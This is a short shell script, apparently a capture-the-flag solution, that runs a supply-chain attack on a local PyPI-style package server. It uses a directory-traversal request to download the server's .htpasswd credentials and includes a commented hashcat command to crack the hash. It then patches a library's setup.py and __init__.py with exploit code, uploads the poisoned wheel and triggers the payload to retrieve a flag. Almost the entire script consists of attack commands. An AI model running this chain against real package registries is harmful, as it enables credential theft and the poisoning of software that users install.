#!/bin/sh

# Use directory traversal bug to get pypiserver creds
curl -k https://127.0.0.1:42425/health/.htpasswd --output creds.txt

# Crack creds with rockyou dictionary
#./hashcat.bin -a 0 -m 101 "{SHA}FyQc7t5bmOBhQ9mGsYPSrSaVeM4=" rockyou.txt

# Add user:pass to pypirc

# Copy FakePyPi config file
cp pypirc ~/.pypirc

# Download and unzip library source files
curl -k https://127.0.0.1:42424/about/concrete_calculator_source --output concrete_calculator.zip
unzip concrete_calculator.zip
rm concrete_calculator.zip

# Patch library with exploit code
patch -ruN concrete_calculator/setup.py -i setup.py.patch
patch -ruN concrete_calculator/concrete_calculator/__init__.py -i __init__.py.patch

# Build patched library and upload to FakePypi server
cd concrete_calculator/
# python setup.py sdist register -r fakepypi upload -r fakepypi  # to test stability with bad package
python setup.py bdist_wheel --universal register -r fakepypi upload -r fakepypi
cd ../
echo "\nWaiting 90 seconds for payload to be applied...\n"
sleep 90

# Trigger payload, retrieve flag, decode and print to screen
python decode.py
